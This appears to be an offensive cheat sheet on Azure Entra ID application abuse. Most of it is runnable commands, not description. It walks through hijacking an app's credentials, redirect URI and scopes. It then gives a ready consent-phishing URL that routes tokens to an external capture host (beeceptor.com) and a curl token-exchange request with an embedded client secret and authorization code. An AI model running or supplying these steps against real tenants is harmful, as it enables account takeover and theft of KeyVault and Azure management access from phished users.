# Applications

From enumerating authorization policies, check for the following in `permissionGrantPoliciesAssigned`:

- `ManagePermissionGrantsForSelf.microsoft-user-default-legacy`: Users can consent to all apps
- `ManagePermissionGrantsForSelf.microsoft-user-default-allow-consent-apps`: Users can consent to apps from verified publishers or your organization and ask for consent
- None of the above: User consent is disabled

## OAuth Phishing

Prerequisite: Owner of the application/Application admin (or equivalent)

```sh
# Check if users are allowed to consent
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"

# Check app details
az ad app show --id "<app-id>" --query "requiredResourceAccess" --output json

# Check specific scope of the app
az ad sp show --id <resourceAppId> --query "oauth2PermissionScopes[?id=='<scope_id>'].value" -o tsv

# Add application secret
az ad app credential reset --id <app_id>

# Change application URI
az ad app update --id <app_id> --web-redirect-uris <url>

# Change application scope
az ad app permission add --api cfa8b339-82a2-471a-a3c9-0fc0be7a4093 --api-permissions f53da476-18e3-4152-8e01-aec403e6edc0=Scope --id <app_id> # cfa8b339-82a2-471a-a3c9-0fc0be7a4093 = KeyVault ; f53da476-18e3-4152-8e01-aec403e6edc0 = user_impersonation
az ad app permission add --api 797f4846-ba00-4fd7-ba43-dac1f8f63013 --api-permissions 41094075-9dad-400e-a0bd-54e686782033=Scope --id <app_id> # 797f4846-ba00-4fd7-ba43-dac1f8f63013 = AzureManagement ; 41094075-9dad-400e-a0bd-54e686782033 = user_impersonation

# Then send a phishing link
"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=8db65d89-2c55-40aa-b5fa-46620f224786&response_type=token&redirect_uri=https://forsure.free.beeceptor.com&response_mode=query&scope=https://vault.azure.net/user_impersonation%20https://management.azure.com/user_impersonation&state=random_state_string"
```

To get access token from it (one scope at a time):

```sh
curl --path-as-is -i -s -k -X $'POST' \
    -H $'Host: login.microsoftonline.com' -H $'User-Agent: curl/7.88.1' -H $'Accept: */*' -H $'Content-Length: 1604' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-binary $'grant_type=authorization_code&client_id=d38ae2ae-867b-417d-81f2-96be3cb1c210&client_secret=olZ8Q~XiLdwoOLeLJGxBnLHhuhJ6DDw8Mw1n8bib&code=1.AUEB4WbQ_TfuvEmwj9DhUhGbBK7iitN7hn1BgfKWvjyxwhAAAABBAQ.BQABBAIAAAADAOz_BQD0_0V2b1N0c0FydGlmYWN0cwIAAAAAABY4NBPocRhODB925hSHa76iM-R9YxTNje3NvqYYkRWjPjV_2ZxfX2sFaDH6idho_cQe5mpgcv4-uQCseXxVQsLiKaSSdRntQGOOMXpCSy_beSW4qwjJGnBCEKkF-gs_684JjZAX0c1Ey3opowrBjGvfYZVBM_A_zO0onyvNekMNpFo75486Taowg0A_c8Nb61BMj4uONYfvYTYysK3FLxhOeo2W5YUAXo0_UItBDZELZkL-rPfLin7_G6VNcUNjJ8nZIy1-yGKJB8oAKTbZu685paHjSUD2nu-u-yOazWaYelNcqwzFXJ57Ezs_XKkRSYYuR7CN76Zszf-CHV4EyVIW43l7LAtii5oGdSgA4CE5SxOQi4RKUB5R01Fq6xyaXDj40zUJXtz0VaRuHCrtPTkgIV0z6MtQZM806V2FkmJcC-BBoke3o8IMWaoJKXycdLjRR841cZQutaaNXKn18CO2svY6ICqli-kstvIebp4VrjGT6xtNt0uoB61QB42O0pcL6VDh8afkr8XF0ELNQX5DxXwMagIOKfaIdaMJxYc8Djdonvwo6eFbcrJhegqSjwv5MGw5TaMXkgsWSSGX5QTz0nYFPMGXLw90A1PqSPfj7adEcuEmiOh52NaLhmqx3jKYwQiVyO_v0y0bnph-zrRsTPuLT4Lv-noRfXaGOp6DKLrt0WPK9puL9l9elrHaxyB0gETiNbVlgB0G9ITZDqvc16cApcoh9oTs9G1lzD4IAR56IQEV6f7mT0LlGkZYUy03IOIMg3p24iDuO1Q9wYhw-R8T7_-N4nBpgbPgxGP7ZZvBf6F-4zjBhb2F7MtMgn7fURtcIOXPERRJaRcBNIe68FJJ31luPUbTUMuOMv5zd_u-0J4m5C1MhyG3ckUargygeqH5SHsDNEPNCaykzrvXnYwD2yU2hxpB4tPbS07V_QdoS3Ucy44CuahdK_B4gl5E8EUyIXuAy_c6J_RwE_WzDezzNybbDE7RcBTCSfV3pJekJLHnkD8AjIVXOxHxoyfZKxzMuviHgcZmvTxLOM4i62JUOHYLEr9weQOPj6ifhWPPBg0V0scmnaW-mLKJZe76bCPL5LMKGa4UGoJAfoOokI92Zmbq5oTAUZ3DU_A3NSGfTJ-ZVy5cQZ_tVySWeB7GFXLeMlMsQIbH4AU9TUtW_YwHTy2R6QuH2DN9pCGKyk5gmDXJNBAZ37T8-jt_UWzINS_371zKWXupE8Er4ho--9-4xpDaOSncxkMZPBEZ&scope=https://vault.azure.net/user_impersonation&redirect_uri=https://forsure.free.beeceptor.com' \
    $'https://login.microsoftonline.com/common/oauth2/v2.0/token'
```

Then by proxying commands, we can perform az requests then use the newly obtained access token.
